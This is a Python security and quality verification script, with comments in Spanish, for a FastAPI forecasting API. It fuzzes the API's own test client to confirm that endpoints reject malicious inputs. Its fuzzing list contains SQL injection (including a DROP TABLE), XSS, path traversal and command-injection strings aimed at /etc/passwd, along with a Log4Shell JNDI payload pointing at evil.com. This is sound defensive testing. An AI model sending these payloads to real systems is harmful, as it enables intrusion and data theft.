"""
pipeline/analytics/run_verification_loops.py
--------------------------------------------
Ejecutor y Orquestador de Bucles de Verificación para Sprint 4 (GiraGroup BI).
Ejecuta de forma automatizada:
- Loop 1: Seguridad OWASP Top 10 (Fuzzing, SQLi, Inyección de parámetros)
- Loop 2: Cabeceras Defensivas y Enmascaramiento de Información (OWASP A05)
- Loop 3: Concurrencia, Escalabilidad y Latencia (P95 SLA)
- Loop 4: Código Limpio y Contratos Estrictos Pydantic v2
- Loop 5: Idempotencia y Consistencia Numérica

Genera un reporte ejecutivo en consola y en Markdown con métricas formales.
"""

import sys
import time
from pathlib import Path
from typing import Dict, Any, List
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_DIR = Path(__file__).resolve().parent.parent.parent
if str(BASE_DIR) not in sys.path:
    sys.path.insert(0, str(BASE_DIR))

BACKEND_DIR = BASE_DIR / "backend"
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

from fastapi.testclient import TestClient
from backend.main import app
from backend.schemas.forecast_schemas import ForecastAlumnosResponse, ForecastMetasResponse

client = TestClient(app)


def ejecutar_loop_owasp() -> Dict[str, Any]:
    """Loop 1: Seguridad OWASP y Fuzzing."""
    vectores = [
        "' OR 1=1 --",
        "1; DROP TABLE public.dim_tiempo; --",
        "<script>alert('XSS')</script>",
        "../../../../etc/passwd",
        "; cat /etc/passwd ;",
        "%00",
        "${jndi:ldap://evil.com/x}",
        "admin'--",
    ]
    limites = [-1, 0, 7, 999999, "abc", 3.14159]

    total_pruebas = 0
    bloqueadas = 0
    t0 = time.perf_counter()

    # 1. Inyección en tipo
    for v in vectores:
        total_pruebas += 1
        r = client.get(f"/api/v1/forecast/alumnos?tipo={v}&horizonte=3")
        if r.status_code in (400, 422):
            bloqueadas += 1

    # 2. Inyección en granularidad
    for v in vectores:
        total_pruebas += 1
        r = client.get(f"/api/v1/forecast/metas?granularidad={v}&horizonte=3")
        if r.status_code in (400, 422):
            bloqueadas += 1

    # 3. Fuzzing de límites
    for l in limites:
        total_pruebas += 1
        r = client.get(f"/api/v1/forecast/alumnos?tipo=GLOBAL&horizonte={l}")
        if r.status_code in (400, 422):
            bloqueadas += 1

    duracion_ms = (time.perf_counter() - t0) * 1000.0
    return {
        "nombre": "Loop 1: Seguridad OWASP Top 10 e Inyección",
        "total": total_pruebas,
        "exitosos": bloqueadas,
        "fallos": total_pruebas - bloqueadas,
        "tasa_exito_pct": round((bloqueadas / total_pruebas) * 100.0, 1),
        "duracion_ms": round(duracion_ms, 2)
    }


def ejecutar_loop_cabeceras_y_fugas() -> Dict[str, Any]:
    """Loop 2: Cabeceras defensivas y enmascaramiento de errores."""
    t0 = time.perf_counter()
    endpoints = [
        "/health",
        "/api/v1/forecast/alumnos?tipo=GLOBAL&horizonte=3",
        "/api/v1/forecast/metas?granularidad=MENSUAL&horizonte=3"
    ]
    cumple_cabeceras = 0
    total_endpoints = len(endpoints)

    for ep in endpoints:
        r = client.get(ep)
        h = r.headers
        if (
            h.get("X-Content-Type-Options") == "nosniff" and
            h.get("X-Frame-Options") == "DENY" and
            "Content-Security-Policy" in h
        ):
            cumple_cabeceras += 1

    # Verificación de no exposición de rutas en 404
    r_err = client.get("/api/v1/ruta_inexistente_fuga_test")
    fuga_detectada = any(kw in r_err.text.lower() for kw in ["c:\\", "/home/", "traceback", "giragroup_secret"])

    duracion_ms = (time.perf_counter() - t0) * 1000.0
    es_valido = (cumple_cabeceras == total_endpoints) and not fuga_detectada
    return {
        "nombre": "Loop 2: Cabeceras Defensivas y No Exposición (A05)",
        "total": total_endpoints + 1,
        "exitosos": cumple_cabeceras + (1 if not fuga_detectada else 0),
        "fallos": 0 if es_valido else 1,
        "tasa_exito_pct": 100.0 if es_valido else 0.0,
        "duracion_ms": round(duracion_ms, 2)
    }


def ejecutar_loop_escalabilidad() -> Dict[str, Any]:
    """Loop 3: Concurrencia y latencia bajo carga."""
    peticiones = [
        "/api/v1/forecast/alumnos?tipo=GLOBAL&horizonte=4",
        "/api/v1/forecast/alumnos?tipo=DIPLOMADO&horizonte=3",
        "/api/v1/forecast/metas?granularidad=MENSUAL&horizonte=4",
        "/api/v1/forecast/metas?granularidad=ANUAL&horizonte=2"
    ] * 10  # 40 peticiones concurrentes

    t0 = time.perf_counter()
    tiempos = []
    exitosos = 0

    def _tarea(url):
        t_req = time.perf_counter()
        resp = client.get(url)
        delta_ms = (time.perf_counter() - t_req) * 1000.0
        return resp.status_code, delta_ms

    with ThreadPoolExecutor(max_workers=8) as ex:
        futuros = [ex.submit(_tarea, u) for u in peticiones]
        for f in as_completed(futuros):
            code, el_ms = f.result()
            if code == 200:
                exitosos += 1
            tiempos.append(el_ms)

    duracion_total_ms = (time.perf_counter() - t0) * 1000.0
    tiempos.sort()
    p95 = tiempos[int(len(tiempos) * 0.95)]
    media = sum(tiempos) / len(tiempos)

    return {
        "nombre": "Loop 3: Escalabilidad y Concurrencia (40 hilos)",
        "total": len(peticiones),
        "exitosos": exitosos,
        "fallos": len(peticiones) - exitosos,
        "latencia_media_ms": round(media, 2),
        "latencia_p95_ms": round(p95, 2),
        "tasa_exito_pct": round((exitosos / len(peticiones)) * 100.0, 1),
        "duracion_ms": round(duracion_total_ms, 2)
    }


def ejecutar_loop_codigo_limpio() -> Dict[str, Any]:
    """Loop 4: Código limpio, validación de contratos Pydantic e invariantes."""
    tipos = ["GLOBAL", "DIPLOMADO", "CURSO", "EXPERTO"]
    horizontes = [1, 2, 3, 4, 5, 6]
    total = len(tipos) * len(horizontes) + 2
    exitos = 0
    t0 = time.perf_counter()

    for tp in tipos:
        for h in horizontes:
            r = client.get(f"/api/v1/forecast/alumnos?tipo={tp}&horizonte={h}")
            if r.status_code == 200:
                try:
                    obj = ForecastAlumnosResponse.model_validate(r.json())
                    # Invariante: no negativo
                    if all(p.valor_forecast >= 0 for p in obj.data.proyecciones):
                        exitos += 1
                except Exception:
                    pass

    # Metas
    for g in ["MENSUAL", "ANUAL"]:
        r = client.get(f"/api/v1/forecast/metas?granularidad={g}&horizonte=3")
        if r.status_code == 200:
            try:
                ForecastMetasResponse.model_validate(r.json())
                exitos += 1
            except Exception:
                pass

    duracion_ms = (time.perf_counter() - t0) * 1000.0
    return {
        "nombre": "Loop 4: Código Limpio y Contratos Pydantic v2",
        "total": total,
        "exitosos": exitos,
        "fallos": total - exitos,
        "tasa_exito_pct": round((exitos / total) * 100.0, 1),
        "duracion_ms": round(duracion_ms, 2)
    }


def ejecutar_loop_idempotencia() -> Dict[str, Any]:
    """Loop 5: Idempotencia y estabilidad numérica."""
    t0 = time.perf_counter()
    r_base = client.get("/api/v1/forecast/alumnos?tipo=GLOBAL&horizonte=6").json()
    base_vals = [p["valor_forecast"] for p in r_base["data"]["proyecciones"]]

    iteraciones = 10
    consistentes = 0

    for _ in range(iteraciones):
        r = client.get("/api/v1/forecast/alumnos?tipo=GLOBAL&horizonte=6").json()
        act_vals = [p["valor_forecast"] for p in r["data"]["proyecciones"]]
        if act_vals == base_vals:
            consistentes += 1

    duracion_ms = (time.perf_counter() - t0) * 1000.0
    return {
        "nombre": "Loop 5: Idempotencia y Estabilidad Numérica (10 iter)",
        "total": iteraciones,
        "exitosos": consistentes,
        "fallos": iteraciones - consistentes,
        "tasa_exito_pct": round((consistentes / iteraciones) * 100.0, 1),
        "duracion_ms": round(duracion_ms, 2)
    }


def main():
    print("=" * 80)
    print("EJECUTANDO BUCLÉS DE VERIFICACIÓN AUTOMATIZADA — SPRINT 4 (GIRAGROUP BI)")
    print("Buenas Prácticas | Código Limpio | Seguridad OWASP | Escalabilidad")
    print("=" * 80)

    loops = [
        ejecutar_loop_owasp(),
        ejecutar_loop_cabeceras_y_fugas(),
        ejecutar_loop_escalabilidad(),
        ejecutar_loop_codigo_limpio(),
        ejecutar_loop_idempotencia()
    ]

    print("\nRESULTADOS POR BUCLE DE VERIFICACIÓN:")
    print("-" * 80)
    for l in loops:
        estado = "PASSED" if l["fallos"] == 0 else "FAILED"
        print(f"[{estado}] {l['nombre']}")
        print(f"       Total pruebas: {l['total']} | Aprobadas: {l['exitosos']} | Fallos: {l['fallos']}")
        print(f"       Tasa de éxito: {l['tasa_exito_pct']}% | Tiempo: {l['duracion_ms']} ms")
        if "latencia_p95_ms" in l:
            print(f"       Latencia Media: {l['latencia_media_ms']} ms | P95: {l['latencia_p95_ms']} ms")
        print("-" * 80)

    total_pruebas = sum(l["total"] for l in loops)
    total_exitos = sum(l["exitosos"] for l in loops)
    total_fallos = sum(l["fallos"] for l in loops)
    tasa_global = round((total_exitos / total_pruebas) * 100.0, 1)

    print(f"\nRESUMEN CONSOLIDADO: {total_exitos}/{total_pruebas} pruebas superadas ({tasa_global}%)")
    if total_fallos == 0:
        print("DICTAMEN: SPRINT 4 100% CUMPLE CON BUENAS PRÁCTICAS, OWASP Y ESCALABILIDAD.")
    else:
        print(f"DICTAMEN: Se detectaron {total_fallos} incidencias que requieren atención.")
    print("=" * 80)


if __name__ == "__main__":
    main()
